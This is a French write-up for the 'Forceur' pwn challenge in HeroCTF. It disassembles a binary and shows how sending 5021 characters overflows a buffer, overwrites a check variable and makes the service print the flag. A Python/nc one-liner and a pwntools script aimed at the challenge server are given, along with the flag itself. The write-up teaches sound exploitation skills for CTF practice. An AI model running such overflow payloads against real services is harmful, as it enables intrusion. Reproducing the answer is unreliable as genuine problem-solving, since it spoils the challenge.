# Forceur

### Catégorie
Pwn

### Description
L'organisateur essaie de vous troll... Forcez-le à vous donner le flag !!!

nc challs.heroctf.fr 7000
Format : Hero{flag}

### Auteur
SoEasY

### Fichiers
Le binaire executé par le service : BOO_1

### Solution
Pour ce premier buffer overflow, on se retrouve avec le binaire "BOO_1".
J'aime toujours faire un file pour savoir à quoi j'ai affaire.

```bash
$ file BOO_1
BOO_1: ELF 64-bit LSB shared object x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, BuildID[sha1]=a8850a66256b523ffd89da03f7cd9d841da2c3a0, for GNU/Linux 3.2.0, not stripped
```

Ok on a donc un ELF x86_64 c'est cool, on l'ouvre dans Cutter (GUI de radare2) pour voir ce qui se cache là dedans.
On désassemble la fonction main (c'est là que tout se passe) et on obtient ceci.

```nasm
171: int main (int argc, char **argv, char **envp);
; var char *s1 @ rbp-0x1390
; var uint32_t var_4h @ rbp-0x4
0x0000124b      endbr64
0x0000124f      push    rbp
0x00001250      mov     rbp, rsp
0x00001253      sub     rsp, _init ; 0x1000
0x0000125a      or      qword [rsp], 0
0x0000125f      sub     rsp, 0x390
0x00001266      mov     rax, qword [stdout] ; rdi
                                   ; 0x4010
0x0000126d      mov     esi, 0     ; char *buf
0x00001272      mov     rdi, rax   ; FILE *stream
0x00001275      call    setbuf     ; sym.imp.setbuf ; void setbuf(FILE *stream, char *buf)
0x0000127a      mov     dword [var_4h], 0xcafebabe
0x00001281      lea     rdi, str.Coucou__on_m_a_dit_que_tu_voulais_un_flag____oui_non ; 0x2050 ; const char *s
0x00001288      call    section..plt.sec ; sym.imp.puts ; int puts(const char *s)
0x0000128d      mov     rdx, qword [stdin] ; obj.stdin__GLIBC_2.2.5
                                   ; 0x4020 ; FILE *stream
0x00001294      lea     rax, [s1]
0x0000129b      mov     esi, 0x139c ; int size
0x000012a0      mov     rdi, rax   ; char *s
0x000012a3      call    fgets      ; sym.imp.fgets ; char *fgets(char *s, int size, FILE *stream)
0x000012a8      lea     rax, [s1]
0x000012af      lea     rsi, str.oui ; 0x2086 ; const char *s2
0x000012b6      mov     rdi, rax   ; const char *s1
0x000012b9      call    strcmp     ; sym.imp.strcmp ; int strcmp(const char *s1, const char *s2)
0x000012be      test    eax, eax
0x000012c0      jne     0x12d0
0x000012c2      lea     rdi, str.Eh_bah_non. ; 0x208b ; const char *s
0x000012c9      call    section..plt.sec ; sym.imp.puts ; int puts(const char *s)
0x000012ce      jmp     0x12dc
0x000012d0      lea     rdi, str.Hum_je_sais_pas_ce_que_tu_fais_l___du_coup... ; 0x2098 ; const char *s
0x000012d7      call    section..plt.sec ; sym.imp.puts ; int puts(const char *s)
0x000012dc      cmp     dword [var_4h], 0xcafebabe
0x000012e3      je      0x12ef
0x000012e5      mov     eax, 0
0x000012ea      call    getFlag    ; sym.getFlag
0x000012ef      mov     eax, 0
0x000012f4      leave
0x000012f5      ret
````

On remarque alors en début de fonction l'initialisation d'un int `var_4h` (4 octets car uint32_t) et d'un buffer de caractères `s1` (qui doit être de 5020 octets : 0x1390 + 0x4 (var_4h) + 0x8 (rbp)).

La variable `var_4h` est initialisée à `0xcafebabe`.
```nasm
0x0000127a      mov     dword [var_4h], 0xcafebabe
```
Le programme va ensuite récupérer l'input de l'utilisateur avec fgets sur stdin sur 0x139c caractères (thérorie du 5020 octets validée) et stocker le résultat dans le buffer `s1`.

```nasm
0x0000128d      mov     rdx, qword [stdin] ; obj.stdin__GLIBC_2.2.5
                                   ; 0x4020 ; FILE *stream
0x00001294      lea     rax, [s1]
0x0000129b      mov     esi, 0x139c ; int size
0x000012a0      mov     rdi, rax   ; char *s
0x000012a3      call    fgets      ; sym.imp.fgets ; char *fgets(char *s, int size, FILE *stream)
```

On remarque le call à la fonction `getFlag` si `var_4h` vaut une valeur différente de `0xcafebabe`.
```nasm
0x000012dc      cmp     dword [var_4h], 0xcafebabe
0x000012e3      je      0x12ef
0x000012e5      mov     eax, 0
0x000012ea      call    getFlag    ; sym.getFlag
0x000012ef      mov     eax, 0
```

Il va donc nous falloir overflow le buffer de 5020 char pour aller modifier la valeur de var_4h qui se trouvera juste à côté du buffer en mémoire !
Pour cela il y a deux écoles : 
- La team "one liner"
```bash
$ python -c "print('a'*5021)" | nc challs.heroctf.fr 7000
Coucou, on m'a dit que tu voulais un flag ? (oui/non)
Hum je sais pas ce que tu fais là du coup...
Hero{W0w_wh4t_4_n1c3_j0b!!}
```
- La team "pwntools"
```python
#!/usr/bin/python
from pwn import *

r = remote('challs.heroctf.fr', 7000)

r.sendline('a'*5021)

r.interactive()
r.close()
```
Exécution : 
```python
python 1.py 
[+] Opening connection to challs.heroctf.fr on port 7000: Done
[*] Switching to interactive mode
Coucou, on m'a dit que tu voulais un flag ? (oui/non)
Hum je sais pas ce que tu fais là du coup...
Hero{W0w_wh4t_4_n1c3_j0b!!}
Bravo, tu peux valider le challenge avec ce flag.
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to challs.heroctf.fr port 7000
```

### Flag
Hero{W0w_wh4t_4_n1c3_j0b!!}


